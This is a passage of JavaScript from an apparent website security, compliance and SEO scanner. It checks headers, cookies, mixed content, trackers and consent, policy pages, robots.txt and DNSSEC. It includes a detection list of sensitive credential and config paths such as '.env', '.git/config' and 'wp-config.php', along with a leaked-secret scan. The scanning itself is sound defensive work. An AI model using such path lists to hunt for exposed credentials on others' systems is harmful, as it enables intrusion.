        id: 'hsts-no-preload', domain: 'security', severity: 'info',
        title: 'HSTS could be strengthened',
        detail: `Missing ${!/includeSubDomains/i.test(hsts) ? '`includeSubDomains`' : ''}${!/preload/i.test(hsts) ? ' `preload`' : ''}.`.trim(),
        fix: 'Add both `includeSubDomains` and `preload`, then submit to the HSTS preload list.',
        evidence: hsts,
      }));
    }
  }

  // Permissions-Policy over-grant: a policy that is present but explicitly
  // allows a powerful feature to every origin (`feature=*`) is worse than
  // useless — it advertises the device capabilities you expose to any embedder.
  const pp = h['permissions-policy'] || '';
  if (pp) {
    const POWERFUL = ['camera', 'microphone', 'geolocation', 'payment', 'usb', 'serial', 'bluetooth', 'hid', 'midi', 'display-capture', 'clipboard-read'];
    const overgranted = [];
    for (const feat of POWERFUL) {
      // Match `feature=*`, `feature=* ...`, `feature="*"` but not `feature=()`.
      const re = new RegExp(`\\b${feat}\\s*=\\s*["']?\\*`, 'i');
      if (re.test(pp)) overgranted.push(feat);
    }
    meta.permissionsPolicy = { raw: pp, overgranted };
    if (overgranted.length) {
      findings.push(makeFinding({
        id: 'hdr-permissions-policy-overgrant', domain: 'security', severity: 'medium',
        title: `Permissions-Policy grants powerful features to all origins (${overgranted.join(', ')})`,
        detail: 'A policy that allows a powerful feature to `*` lets any embedding origin use it, defeating the purpose of the header.',
        fix: `Restrict each powerful feature to \`self\`, e.g. \`${overgranted[0]}=()\` or \`${overgranted[0]}=(self)\`.`,
        evidence: pp,
      }));
    }
  }

  // Deprecated headers still being served.
  // Note: `X-XSS-Protection: 0` is the modern OWASP-recommended value that
  // explicitly disables legacy browser XSS auditors; only non-zero values
  // (e.g. `1` or `1; mode=block`) are deprecated/harmful.
  for (const [name, why] of [
    ['x-xss-protection', 'Browsers no longer implement it; enabling it (`1; mode=block`) can introduce XS-Leak/XSS issues. Set to `0` or remove.'],
    ['expect-ct', 'Removed from browsers — Certificate Transparency is now enforced by default.'],
    ['feature-policy', 'Renamed to `Permissions-Policy`.'],
  ]) {
    if (h[name]) {
      if (name === 'x-xss-protection' && String(h[name]).trim() === '0') continue;
      findings.push(makeFinding({
        id: 'hdr-deprecated-' + name, domain: 'security', severity: 'low',
        title: `Deprecated header present: \`${name}\``,
        detail: why,
        fix: `Remove the \`${name}\` header (or set \`X-XSS-Protection: 0\`).`,
        evidence: String(h[name]),
      }));
    }
  }

  // XSS-unsafe legacy API usage in markup.
  const html = res.body || '';
  if (/document\.domain\s*=/.test(html)) {
    // Show the actual declaration(s) so the reader sees where it is used.
    const hits = [...html.matchAll(/[^\n]*document\.domain\s*=[^\n;]*;?/g)].map((m) => m[0].trim()).slice(0, 5);
    findings.push(makeFinding({
      id: 'deprecated-document-domain', domain: 'security', severity: 'low',
      title: 'Use of `document.domain`',
      detail: '`document.domain` is deprecated and disables origin isolation.',
      fix: 'Use `postMessage` / `Origin-Agent-Cluster` instead of relaxing `document.domain`.',
      evidence: hits.length ? hits.join('\n').slice(0, 500) : null,
    }));
  }

  // Attach the exact response (URL + status + headers sent) to every finding
  // created above that has no evidence yet, so "where exactly" is never blank.
  const headerDump = Object.keys(h).map((k) => `${k}: ${h[k]}`).join('\n');
  for (let i = firstNew; i < findings.length; i++) {
    const f = findings[i];
    if (!f.evidence) {
      f.evidence = `GET ${res.url} → HTTP ${res.status}\n\nHeaders actually sent:\n${headerDump}`.slice(0, 2000);
    }
    if (!f.locations) f.locations = [{ scope: 'response', url: res.url }];
  }
}

function parseCookies(setCookie) {
  if (!setCookie) return [];
  const arr = Array.isArray(setCookie) ? setCookie : [setCookie];
  return arr.map((c) => {
    const [pair, ...attrs] = c.split(';');
    const [name] = pair.split('=');
    const lower = attrs.map((a) => a.trim().toLowerCase());
    return {
      name: name.trim(),
      secure: lower.includes('secure'),
      httpOnly: lower.includes('httponly'),
      sameSite: (lower.find((a) => a.startsWith('samesite')) || '').split('=')[1] || null,
      raw: c,
    };
  });
}

const WAF_COOKIE_RE = /^(?:visid_incap|incap_ses|nlbi_|__cf|cf_|datadome|awswaf|_dd_s|_vercel|vercel_)/i;

function checkCookies(res, findings, meta) {
  if (meta?.isWafChallenge || isWafChallenge(res, res.body)) return;
  const cookies = parseCookies(res.headers['set-cookie']);
  meta.cookies = cookies.map((c) => ({ name: c.name, secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite }));
  for (const c of cookies) {
    if (WAF_COOKIE_RE.test(c.name)) continue;
    // Exact Set-Cookie line so the reader sees the offending cookie verbatim.
    const cookieLoc = { header: 'Set-Cookie', cookie: c.name, raw: (c.raw || '').trim().slice(0, 300) };
    if (new URL(res.url).protocol === 'https:' && !c.secure) {
      const f = makeFinding({
        id: 'cookie-insecure-' + c.name,
        domain: 'security',
        severity: 'medium',
        title: `Cookie "${c.name}" missing Secure flag`,
        detail: 'The cookie can be transmitted over plain HTTP.',
        fix: 'Add the `Secure` attribute to all cookies.',
        evidence: (c.raw || '').trim().slice(0, 300),
      });
      f.locations = [cookieLoc];
      findings.push(f);
    }
    if (!c.httpOnly) {
      const f = makeFinding({
        id: 'cookie-httponly-' + c.name,
        domain: 'security',
        severity: 'low',
        title: `Cookie "${c.name}" missing HttpOnly flag`,
        detail: 'Accessible to JavaScript, increasing XSS impact.',
        fix: 'Add `HttpOnly` to session/auth cookies.',
        evidence: (c.raw || '').trim().slice(0, 300),
      });
      f.locations = [cookieLoc];
      findings.push(f);
    }
    if (!c.sameSite) {
      const f = makeFinding({
        id: 'cookie-samesite-' + c.name,
        domain: 'security',
        severity: 'low',
        title: `Cookie "${c.name}" missing SameSite attribute`,
        detail: 'Default browser behaviour varies; explicit SameSite reduces CSRF risk.',
        fix: 'Set `SameSite=Lax` (or `Strict`) explicitly.',
        evidence: (c.raw || '').trim().slice(0, 300),
      });
      f.locations = [cookieLoc];
      findings.push(f);
    }
  }
}

function checkBody(body, res, findings, meta) {
  if (meta && meta.isWafChallenge) return;
  const u = new URL(res.url);

  // Mixed content (subresource loads over plain HTTP)
  if (u.protocol === 'https:') {
    const subresourceMixed = [];
    // 1. Script, image, iframe, audio, video, embed, input src
    const srcMatches = body.match(/<(?:script|img|iframe|audio|video|embed|input)\b[^>]*\bsrc\s*=\s*["'](http:\/\/[^"'\s>]+)/gi) || [];
    for (const m of srcMatches) {
      const urlMatch = m.match(/\bsrc\s*=\s*["'](http:\/\/[^"'\s>]+)/i);
      if (urlMatch) subresourceMixed.push(urlMatch[1]);
    }
    // 2. Source/picture srcset
    const srcsetMatches = body.match(/<source\b[^>]*\b(?:src|srcset)\s*=\s*["'](http:\/\/[^"'\s>]+)/gi) || [];
    for (const m of srcsetMatches) {
      const urlMatch = m.match(/\b(?:src|srcset)\s*=\s*["'](http:\/\/[^"'\s>]+)/i);
      if (urlMatch) subresourceMixed.push(urlMatch[1]);
    }
    // 3. Object data
    const objectMatches = body.match(/<object\b[^>]*\bdata\s*=\s*["'](http:\/\/[^"'\s>]+)/gi) || [];
    for (const m of objectMatches) {
      const urlMatch = m.match(/\bdata\s*=\s*["'](http:\/\/[^"'\s>]+)/i);
      if (urlMatch) subresourceMixed.push(urlMatch[1]);
    }
    // 4. Stylesheet or preload link href
    const linkMatches = body.match(/<link\b[^>]*\bhref\s*=\s*["'](http:\/\/[^"'\s>]+)[^>]*>/gi) || [];
    for (const m of linkMatches) {
      if (/rel\s*=\s*["'](?:stylesheet|preload|prefetch|icon|shortcut icon)["']/i.test(m)) {
        const urlMatch = m.match(/\bhref\s*=\s*["'](http:\/\/[^"'\s>]+)/i);
        if (urlMatch) subresourceMixed.push(urlMatch[1]);
      }
    }
    const mixed = [...new Set(subresourceMixed)].slice(0, 8);
    if (mixed.length) {
      findings.push(makeFinding({
        id: 'mixed-content',
        domain: 'security',
        severity: 'high',
        title: `${mixed.length} mixed-content subresource(s) over plain HTTP`,
        detail: 'Loading HTTP subresources (scripts, images, stylesheets, iframes) on an HTTPS page is blocked by modern browsers (mixed-content blocking). Note: outbound navigation links (<a href>) are not mixed content.',
        fix: 'Serve every subresource asset over HTTPS (or use protocol-relative // URLs).',
        evidence: mixed.join('\n'),
      }));
    }
  }

  // Leaked secrets
  const found = scanSecrets(body);
  if (found.length) {
    findings.push(makeFinding({
      id: 'secret-leak',
      domain: 'security',
      severity: 'critical',
      title: 'Potential secrets exposed in page source',
      detail: 'Possible credentials were found in HTML/JS delivered to the browser.',
      fix: 'Move secrets server-side immediately, rotate them, and add build-time secret scanning.',
      evidence: found.join('\n'),
    }));
  }

  // Source map / dev artifacts
  const maps = body.match(/sourceMappingURL=[^\s"'*]+\.map/gi) || [];
  if (maps.length) {
    findings.push(makeFinding({
      id: 'sourcemaps',
      domain: 'security',
      severity: 'low',
      title: `${maps.length} JavaScript source map reference(s)`,
      detail: 'Source maps expose original source code to anyone who opens dev tools.',
      fix: 'Disable source maps in production or restrict access to them.',
    }));
  }

  // Exposed infra paths
  const infra = ['.env', '.git/config', 'wp-config.php', 'phpinfo.php', 'adminer.php', '.DS_Store'];
  const hit = infra.filter((p) => body.includes(p));
  if (hit.length) {
    findings.push(makeFinding({
      id: 'infra-paths',
      domain: 'security',
      severity: 'medium',
      title: 'References to sensitive infrastructure paths',
      detail: `Found references to: ${hit.join(', ')}.`,
      fix: 'Ensure these files are never web-accessible and remove stray links.',
    }));
  }

  // Forms without CSRF / over http
  const forms = (body.match(/<form[\s\S]*?<\/form>/gi) || []);
  const insecureForms = forms.filter((f) => /action\s*=\s*["']http:\/\//i.test(f));
  if (insecureForms.length) {
    findings.push(makeFinding({
      id: 'insecure-form',
      domain: 'security',
      severity: 'high',
      title: `${insecureForms.length} form(s) submit over plain HTTP`,
      detail: 'User input could be intercepted in transit.',
      fix: 'Point form actions at https:// endpoints.',
    }));
  }
}

/**
 * Policy-page presence. Scans the supplied page bodies (homepage + crawled
 * pages) for each legal-policy fingerprint and emits a finding for any that is
 * absent. Idempotent: any previous `policy-*` finding is dropped first so the
 * post-crawl re-check can flip a "missing" to found without duplicating.
 */
function checkPolicies(pageBodies, findings, meta) {
  for (let i = findings.length - 1; i >= 0; i--) {
    if (String(findings[i].id).startsWith('policy-')) findings.splice(i, 1);
  }
  if (meta && meta.isWafChallenge) return;
  const bodies = (pageBodies || []).filter(Boolean);
  meta.policies = {};
  const hasCookiesOrTrackers = ((meta.cookies && meta.cookies.length > 0) || (meta.trackers && meta.trackers.length > 0));
  const isPrivatePortal = Boolean(meta.seo && meta.seo.isPrivatePortal);

  for (const [label, re] of POLICY_RULES) {
    let ok = bodies.some((b) => re.test(b));
    // Under ePrivacy Art. 5(3), a standalone Cookie Policy is not required if
    // the site sets zero cookies and loads zero third-party trackers.
    if (label === 'cookie policy' && !hasCookiesOrTrackers) ok = true;
    // On an intentionally private, non-indexed login gate (noindex + Disallow: /)
    // with zero cookies/trackers before login, public marketing legal links are inapplicable.
    if (isPrivatePortal && !hasCookiesOrTrackers) ok = true;

    // Terms of service / general terms are a contractual instrument (consumer law / contract law),
    // NOT a GDPR requirement. They only apply where contracts are formed: e-commerce (cart/checkout/pricing)
    // or user accounts/registration. Informational, educational, public and editorial sites do not have Terms.
    if (label === 'terms') {
      const hasCommerceOrAccount = bodies.some((b) =>
        /(?:add to (?:cart|basket)|shopping[- ]cart|v košarico|\bcheckout\b|buy now|order now|kupi zdaj|na blagajno|create account|registracija|sign up|prijava v račun)\b/i.test(b)
      );
      if (!hasCommerceOrAccount) ok = true;
    }

    meta.policies[label] = ok;
    if (!ok) {
      const detailText = label === 'terms'
        ? `Terms of service are expected for websites offering commercial transactions, distance contracts, or user account services.`
        : `A ${label} is expected for an EU-facing website (checked the homepage and ${Math.max(0, bodies.length - 1)} crawled page(s)).`;
      findings.push(makeFinding({
        id: 'policy-' + slug(label),
        domain: 'compliance',
        severity: label === 'privacy policy' ? 'high' : 'medium',
        title: `No ${label} link found`,
        detail: detailText,
        fix: `Publish and link a ${label} (footer is fine).`,
      }));
    }
  }
}

function checkCompliance(body, res, findings, meta, peripherals) {
  if (meta && meta.isWafChallenge) return;
  const text = body.toLowerCase();

  // Tracking / third-party trackers
  const trackers = [
    ['Google Analytics', /googletagmanager\.com|google-analytics\.com|gtag\(/i],
    ['Meta Pixel', /connect\.facebook\.net|fbq\(/i],
    ['Hotjar', /hotjar\.com/i],
    ['TikTok Pixel', /analytics\.tiktok\.com/i],
    ['LinkedIn Insight', /snap\.licdn\.com/i],
    ['DoubleClick', /doubleclick\.net/i],
  ].filter(([, re]) => re.test(body)).map(([n]) => n);
  meta.trackers = trackers;

  if (trackers.length) {
    findings.push(makeFinding({
      id: 'trackers',
      domain: 'compliance',
      severity: 'info',
      title: `${trackers.length} tracker(s) detected`,
      detail: trackers.join(', ') + '. Each requires a lawful basis and consent under GDPR/ePrivacy before it fires.',
      fix: 'Load trackers only after explicit opt-in consent; document the lawful basis in your records.',
    }));
  }

  // Consent banner detection (heuristic)
  const consentRe = /cookie[- _]?consent|cookie[ _-]?banner|consent[- _]?management|termly|app\.termly\.io|essential cookies|non-essential cookies|with your consent|preferences.*decline.*accept|klaro|onetrust|cookiebot|cookieyes|complianz|iubenda|didomi|privacy-center\.org|spcloader|usercentrics|sourcepoint|axeptio|borlabs|tarteaucitron|gdpr[- _]?consent|nastavitve piškotkov|cookie-trigger|cookie-modal|gtag\(['"]consent['"]|type=["'](?:didomi\/javascript|text\/plain|text\/consent)/i;
  const hasBanner = consentRe.test(body);
  if (trackers.length && !hasBanner) {
    findings.push(makeFinding({
      id: 'no-consent',
      domain: 'compliance',
      severity: 'high',
      title: 'Trackers load before user consent ("Ghost Banner" / Prior Consent violation)',
      detail: 'Analytics/marketing trackers fire immediately on arrival without prior consent or Consent Mode gating. Even if a consent banner is displayed visually, firing trackers before the user opts in violates GDPR Art. 7 & ePrivacy mandates.',
      fix: 'Add a prior-consent banner that blocks non-essential cookies until the user opts in, or configure Google Consent Mode v2 defaulting to denied.',
    }));
  } else if (trackers.length && hasBanner) {
    findings.push(makeFinding({
      id: 'consent-present',
      domain: 'compliance',
      severity: 'info',
      title: 'Consent mechanism detected',
      detail: 'A consent pattern was found in the markup. Verify trackers are actually blocked *before* consent (not just after a click).',
      fix: 'Test with cookies cleared: no analytics request should fire before the user accepts.',
    }));
  }

  // Policy pages — homepage only here; re-checked against every crawled page
  // body after the deep crawl (see `checkPolicies` call in scan()).
  checkPolicies([body], findings, meta);

  // Data residency hint
  const cdnHints = ['cloudflare', 'fastly', 'google cloud', 'amazonaws', 'netlify', 'vercel', 'bunnycdn', 'heroku'];
  const hostHints = Object.entries(peripherals.headers || {})
    .map(([k, v]) => `${k}: ${v}`).join('\n').toLowerCase();
  const usedCdn = cdnHints.filter((c) => hostHints.includes(c));
  meta.infraHints = usedCdn;
  if (usedCdn.length) {
    findings.push(makeFinding({
      id: 'data-residency',
      domain: 'compliance',
      severity: 'info',
      title: 'Third-party infrastructure detected',
      detail: `Indicators: ${usedCdn.join(', ')}. Verify data-processing agreements (DPA) and, if data leaves the EU, that a valid transfer mechanism (SCCs) exists.`,
      fix: 'Document all sub-processors and sign DPAs; prefer EU regions.',
    }));
  }
}

function checkSeo(body, res, findings, meta, peripherals) {
  if (meta && meta.isWafChallenge) return;
  const html = body;
  const pick = (re) => {
    const m = html.match(re);
    return m ? (m[1] || '').trim() : null;
  };

  // Attribute values may be quoted OR unquoted in real-world HTML.
  const AV = (name) => new RegExp(`\\b${name}\\s*=\\s*(?:"([^"]*)"|'([^']*)'|([^\\s"'>]+))`, 'i');
  const attrVal = (tag, name) => {
    const m = tag.match(AV(name));
    return m ? (m[1] ?? m[2] ?? m[3] ?? '') : null;
  };

  const title = pick(/<title[^>]*>([\s\S]*?)<\/title>/i);

  // meta[name=description][content=...] in either order, tolerant of quoting
  let desc = null;
  const metas = html.match(/<meta\b[^>]*>/gi) || [];
  for (const tag of metas) {
    const n = attrVal(tag, 'name');
    if (n && n.toLowerCase() === 'description') {
      desc = attrVal(tag, 'content') || '';
      break;
    }
  }

  const htmlTag = (html.match(/<html\b[^>]*>/i) || [''])[0];
  const lang = attrVal(htmlTag, 'lang');

  const canonical = /rel\s*=\s*(?:"canonical"|'canonical'|canonical)/i.test(html);

  let viewport = false;
  for (const tag of metas) {
    const n = attrVal(tag, 'name');
    if (n && n.toLowerCase() === 'viewport') { viewport = true; break; }
  }

  const h1 = (html.match(/<h1[\s>]/gi) || []).length;
  const og = /\bproperty\s*=\s*(?:"og:|'og:|og:)/i.test(html);
  const structured = /application\/ld\+json/i.test(html);
  const privatePortal = seoLib.isIntentionallyPrivate(html, res, peripherals);

  meta.seo = Object.assign(meta.seo || {}, { title, desc, canonical, lang, viewport, h1Count: h1, og, structured, isPrivatePortal: privatePortal });

  if (!viewport) findings.push(mk('seo-viewport', 'No viewport meta', 'Page will not scale on mobile.', 'Add <meta name="viewport" content="width=device-width, initial-scale=1">.'));
  if (!lang) findings.push(mk('seo-lang', 'No lang attribute on <html>', 'Hurts accessibility and internationalisation.', 'Set <html lang="sl"> or the correct language.'));
  if (res.status !== 200) findings.push(mk('seo-status', `Page returned HTTP ${res.status}`, 'Non-200 status hurts indexing and users.', 'Serve a 200 for the canonical URL.'));

  function mk(id, title, detail, fix, ev) {
    return makeFinding({ id, domain: 'seo', severity: 'low', title, detail, fix, evidence: ev || null });
  }

  // If the page intentionally opts out of search indexing (both `Disallow: /` in
  // robots.txt and `<meta name="robots" content="noindex">`), public search-engine
  // ranking checks (SERP snippet lengths, canonical, sitemap, structured data)
  // do not apply; `seoLib.checkIndexability` records `seo-private-noindex` (info).
  if (privatePortal) return;
  if (meta && meta.isWafChallenge) return;

  if (!title) findings.push(mk('seo-title', 'No <title> tag', 'Search engines need a title.', 'Add a unique 50–60 char <title>.'));
  else if (title.length < 15 || title.length > 65) findings.push(mk('seo-title-len', `Title length is ${title.length} chars`, 'Titles outside 15–65 characters get truncated.', 'Target 50–60 characters.', title));

  if (!desc) findings.push(mk('seo-desc', 'No meta description', 'Search snippets will be generated arbitrarily.', 'Add a 120–160 char meta description.'));
  else if (desc.length < 50 || desc.length > 165) findings.push(mk('seo-desc-len', `Description length is ${desc.length} chars`, 'Ideal is 120–160 characters.', 'Trim or expand the meta description.', desc));

  if (!canonical) findings.push(mk('seo-canonical', 'No canonical link', 'Duplicate-content signals may split ranking.', 'Add <link rel="canonical"> pointing at the preferred URL.'));

  // Note: <h1> presence is already evaluated by `a11y-h1` / `a11y-h1-multi`,
  // Open Graph by `seo-social-image`, and JSON-LD by `seo-structured-data` in
  // `lib/seo.js`. Avoid emitting duplicate findings for the same missing tag.

  // peripherals
  const robots = peripherals.robots;
  if (!robots || robots.status !== 200) {
    findings.push(makeFinding({
      id: 'seo-robots',
      domain: 'seo',
      severity: 'low',
      title: 'No robots.txt',
      detail: 'Crawlers and AI agents get no guidance or restrictions, and search engines receive no sitemap pointer.',
      fix: 'Publish /robots.txt with a Sitemap: directive and deliberate crawl rules.'
    }));
  } else {
    // Only flag seo-robots-block if User-agent: * specifically blocks the entire site
    const lines = robots.body.split(/\r?\n/);
    let currentUserAgent = '';
    let starDisallowAll = false;
    let starAllowAll = false;
    for (const rawLine of lines) {
      const line = rawLine.replace(/#.*$/, '').trim();
      if (!line) continue;
      const uaMatch = line.match(/^User-agent:\s*(.+)$/i);
      if (uaMatch) {
        currentUserAgent = uaMatch[1].trim();
        continue;
      }
      if (currentUserAgent === '*') {
        if (/^Disallow:\s*\/\s*$/i.test(line)) {
          starDisallowAll = true;
        } else if (/^Allow:\s*\/\s*$/i.test(line)) {
          starAllowAll = true;
        }
      }
    }
    if (starDisallowAll && !starAllowAll) {
      findings.push(makeFinding({ id: 'seo-robots-block', domain: 'seo', severity: 'high', title: 'robots.txt blocks the entire site', detail: '`User-agent: *` with `Disallow: /` prevents all indexing.', fix: 'Remove the blanket disallow unless this is intentional (e.g. staging).' }));
    }
  }
  if (!peripherals.sitemap || peripherals.sitemap.status !== 200) {
    findings.push(makeFinding({ id: 'seo-sitemap', domain: 'seo', severity: 'low', title: 'No sitemap.xml', detail: 'A sitemap speeds up discovery of pages.', fix: 'Generate /sitemap.xml and reference it in robots.txt.' }));
  }
}

function checkQuality(body, res, findings, meta) {
  if (meta && meta.isWafChallenge) return;
  const html = body;
  const imgs = html.match(/<img\b[^>]*>/gi) || [];
  const noAlt = imgs.filter((t) => {
    if (/alt\s*=/i.test(t)) return false;
    // Exclude 1x1 tracking pixels, hidden images, or analytics beacons per WCAG decorative rules
    if (/(?:width|height)\s*=\s*["']?[01]["']?/i.test(t)) return false;
    if (/style\s*=\s*["'][^"']*(?:display\s*:\s*none|visibility\s*:\s*hidden|width\s*:\s*[01]px|height\s*:\s*[01]px)/i.test(t)) return false;
    if (/aria-hidden\s*=\s*["']true["']|\bhidden\b/i.test(t)) return false;
    if (/facebook\.com\/tr|\/tr\?id=|google-analytics\.com|doubleclick\.net|clarity\.ms|bat\.bing\.com|linkedin\.com\/px/i.test(t)) return false;
    return true;
  });
  if (noAlt.length) {
    const noAltSamples = noAlt.map((t) => {
      const m = t.match(/src\s*=\s*["']([^"']+)["']/i);
      return m ? m[1] : t.slice(0, 100);
    }).slice(0, 10);
    findings.push(makeFinding({
      id: 'a11y-alt',
      domain: 'quality',
      severity: 'medium',
      title: `${noAlt.length} image(s) without alt text`,
      detail: 'Screen readers cannot describe these images; also an accessibility-compliance gap (WCAG / EU Accessibility Act).',
      fix: 'Add meaningful `alt` attributes (empty alt="" only for purely decorative images).',
      evidence: noAltSamples.join('\n'),
    }));
  }

  const legacyImgs = imgs.filter((t) => /\.(png|jpe?g|gif)["']/i.test(t) && !/\.webp|\.avif/i.test(t));
  if (legacyImgs.length > 2) {
    const legacySamples = legacyImgs.map((t) => {
      const m = t.match(/src\s*=\s*["']([^"']+)["']/i);
      return m ? m[1] : t.slice(0, 100);
    }).slice(0, 10);
    findings.push(makeFinding({
      id: 'img-format',
      domain: 'quality',
      severity: 'low',
      title: `${legacyImgs.length} images served as PNG/JPEG/GIF`,
      detail: 'Modern formats (WebP/AVIF) are typically 30–60% smaller.',
      fix: 'Convert images to WebP/AVIF and serve with <picture> fallbacks.',
      evidence: legacySamples.join('\n'),
    }));
  }

  // Compression
  const enc = res.headers['content-encoding'];
  if (!enc) {
    findings.push(makeFinding({
      id: 'no-compression',
      domain: 'quality',
      severity: 'low',
      title: 'Response is not compressed',
      detail: 'No Content-Encoding header — HTML is sent uncompressed.',
      fix: 'Enable gzip or brotli compression at the server/CDN.',
    }));
  }

  // Caching
  if (!res.headers['cache-control'] && !res.headers['etag'] && !res.headers['last-modified']) {
    findings.push(makeFinding({
      id: 'no-cache',
      domain: 'quality',
      severity: 'low',
      title: 'No caching headers',
      detail: 'Browser/CDN cannot cache the response, increasing repeat load times.',
      fix: 'Set Cache-Control (and ETag) appropriately for static and dynamic content.',
    }));
  }

  // Inline scripts / blocking resources
  // Exclude non-executable data blocks (application/ld+json, importmap, speculationrules, text/plain)
  // and framework SSR hydration payload streams (Next.js self.__next_f.push, __NEXT_DATA__, __NUXT__).
  // Use linear indexOf scanning so huge/malformed <script> payloads cannot stall regex backtracking.
  const lowerHtml = html.toLowerCase();
  let inlineScripts = 0;
  let scriptPos = 0;
  while (scriptPos < lowerHtml.length) {
    const open = lowerHtml.indexOf('<script', scriptPos);
    if (open === -1) break;
    const after = lowerHtml[open + 7];
    if (after !== undefined && after !== '>' && after !== '/' && !/\s/.test(after)) {
      scriptPos = open + 1;
      continue;
    }
    const gt = html.indexOf('>', open + 7);
    if (gt === -1) break;
    const close = lowerHtml.indexOf('</script', gt + 1);
    if (close === -1) break;
    const attrs = html.slice(open + 7, gt);
    const content = html.slice(gt + 1, close).trim();
    scriptPos = close + 9;
    if (/\bsrc\s*=/i.test(attrs)) continue;
    if (/type\s*=\s*["']?(?:application\/ld\+json|application\/json|importmap|speculationrules|text\/plain|text\/template)["']?/i.test(attrs)) {
      continue;
    }
    if (/^(?:\(self\.__next_f=self\.__next_f\|\|\[\]\)\.push|self\.__next_f\.push|window\.__NEXT_DATA__\s*=|window\.__NUXT__\s*=)/.test(content)) {
      continue;
    }
    if (/id\s*=\s*["']__NEXT_DATA__["']/i.test(attrs)) continue;
    if (content.length > 0) inlineScripts += 1;
  }
  if (inlineScripts > 3) {
    findings.push(makeFinding({
      id: 'inline-scripts',
      domain: 'quality',
      severity: 'low',
      title: `${inlineScripts} inline <script> blocks`,
      detail: 'Inline scripts block CSP hardening and add parse cost.',
      fix: 'Externalise scripts or use nonce-based CSP; defer non-critical JS.',
    }));
  }
  // Render-blocking scripts only apply to synchronous external scripts parsed in the initial HTML stream.
  // Ignore scripts with defer, async, nomodule (ignored in modern browsers), or type="module" (deferred by HTML spec).
  // Also skip if evaluating post-hydration rendered DOM where dynamically injected chunk preloads appear without async attributes.
  const isPostJsDom = meta && (meta.isRenderedDom || meta.renderBody === html);
  const renderBlocking = isPostJsDom ? 0 : (html.match(/<script(?![^>]*\b(defer|async|nomodule)\b)(?![^>]*\btype\s*=\s*["']?module\b)[^>]*\bsrc=/gi) || []).length;
  if (renderBlocking > 1) {
    findings.push(makeFinding({
      id: 'render-blocking',
      domain: 'quality',
      severity: 'medium',
      title: `${renderBlocking} render-blocking scripts`,
      detail: 'Synchronous external scripts delay first paint.',
      fix: 'Add `defer` (or `async`) to non-critical scripts.',
    }));
  }

  const deprecations = [];
  if (/<font\b/i.test(html)) deprecations.push('<font>');
  if (/<marquee\b/i.test(html)) deprecations.push('<marquee>');
  // `onclick=` appears legitimately inside JSON-LD, data attributes and text.
  // Only flag it when it is a real attribute on an element, and never when the
  // page clearly uses modern event binding (addEventListener / React handlers).
  if (/<[a-z][^>]*\son[a-z]+\s*=\s*["']/i.test(html) && !/addEventListener|onClick|on[A-Z][a-z]+\s*[:=]/i.test(html)) {
    deprecations.push('inline event handlers');
  }
  if (deprecations.length) {
    findings.push(makeFinding({
      id: 'deprecated',
      domain: 'quality',
      severity: 'low',
      title: 'Deprecated / legacy markup',
      detail: deprecations.join(', '),
      fix: 'Replace with modern equivalents (CSS, event listeners).',
    }));
  }

  meta.weightBytes = res.bytes;
  if (res.bytes > 1_500_000) {
    findings.push(makeFinding({
      id: 'page-weight',
      domain: 'quality',
      severity: 'medium',
      title: `HTML document is ${(res.bytes / 1024).toFixed(0)} KB`,
      detail: 'A large HTML payload delays parsing and first render.',
      fix: 'Trim inlined data, split pages, and paginate large lists.',
    }));
  }
}

/* ------------------------------------------------------------------ *
 * Peripheral fetches
 * ------------------------------------------------------------------ */

async function fetchPeripheral(origin, path, bypassProxy = false) {
  try {
    // Proxied only. This used to retry straight from the host on 403/429/WAF,
    // which sent /robots.txt and friends to the target from our own VPS address.
    const r = await rawRequest(new URL(path, origin).toString(), { maxRedirects: 3, bypassProxy });
    if (r.status === 200 && r.body) {
      const ctype = String((r.headers && r.headers['content-type']) || '').toLowerCase();
      const head = r.body.slice(0, 300).trim().toLowerCase();
      // Guard against SPA catch-all routes and auth gates that return HTTP 200
      // with an HTML document (`<!DOCTYPE html>`) for `/robots.txt`, `/llms.txt`,
      // `/sitemap.xml`, or `/.well-known/security.txt`.
      if (ctype.includes('text/html') || head.startsWith('<!doctype html') || head.startsWith('<html')) {
        return { ...r, status: 404, body: '', soft404: true };
      }
    }
    return r;
  } catch (e) {
    return { status: 0, error: e.message, body: '', headers: {} };
  }
}

/* ------------------------------------------------------------------ *
 * Extended checks: DNS / email security, CORS, path exposure,
 * JS-bundle analysis, tech fingerprint, broken links
 * ------------------------------------------------------------------ */

/**
 * Best-effort registrable ("organisational") domain for a hostname, with a
 * small list of common multi-label public suffixes. Email/DNSSEC records
 * (SPF, DMARC, MTA-STS, CAA) are published on the ORGANISATION domain, not on
 * arbitrary subdomains, so a subdomain like `developer.mozilla.org` must also
 * be checked against `mozilla.org` — otherwise every subdomain target is
 * reported as "no SPF / no DMARC", which is a false positive.
 */
const MULTI_LABEL_SUFFIXES = new Set([
  'co.uk', 'org.uk', 'gov.uk', 'ac.uk', 'co.jp', 'co.nz', 'com.au', 'net.au',
  'org.au', 'com.br', 'com.cn', 'com.mx', 'co.za', 'co.in', 'com.tr', 'com.sg',
  'co.kr', 'com.hk', 'co.il', 'com.ar', 'com.pl', 'com.tw', 'co.id',
]);
function registrableDomain(host) {
  const labels = String(host).split('.').filter(Boolean);
  if (labels.length <= 2) return host;
  const lastTwo = labels.slice(-2).join('.');
  if (MULTI_LABEL_SUFFIXES.has(lastTwo)) {
    return labels.slice(-3).join('.');
  }
  return lastTwo;
}

/**
 * Is a domain DNSSEC-signed? Node's resolver cannot query the DS rrset
 * (`dns.resolve(n, 'DS')` throws ERR_INVALID_ARG_VALUE), so a DS lookup has to
 * go over DNS-over-HTTPS. Queries Cloudflare's DoH endpoint (and Google's as a
 * fallback); returns true iff any checked name has a DS record. Best-effort:
 * network failure yields false rather than a bogus "missing DNSSEC" finding.
 */
async function dnssecSigned(names) {
  const endpoints = ['https://cloudflare-dns.com/dns-query', 'https://dns.google/resolve'];
  for (const name of names) {
    for (const ep of endpoints) {
      try {
        const res = await rawRequest(`${ep}?name=${encodeURIComponent(name)}&type=DS`, {
          headers: { accept: 'application/dns-json' },
          maxRedirects: 2,
        });
        if (!res || res.status !== 200) continue;
        const json = JSON.parse(res.body);
        if (Array.isArray(json.Answer) && json.Answer.some((a) => a.type === 43)) {
          return true;
        }
        // Status 0 with no DS answer is authoritative: this name is unsigned.
        if (json.Status === 0) break;
      } catch (e) { /* try next endpoint */ }
    }
  }
  return false;
}

async function checkDnsSecurity(hostname, res, findings, meta) {
  // Skip bare IPs — no DNS records to inspect.
  if (net.isIP(hostname)) return;
  const { Resolver } = require('dns').promises;
  const dns = new Resolver();
  dns.setServers(['1.1.1.1', '8.8.8.8', '1.0.0.1']);
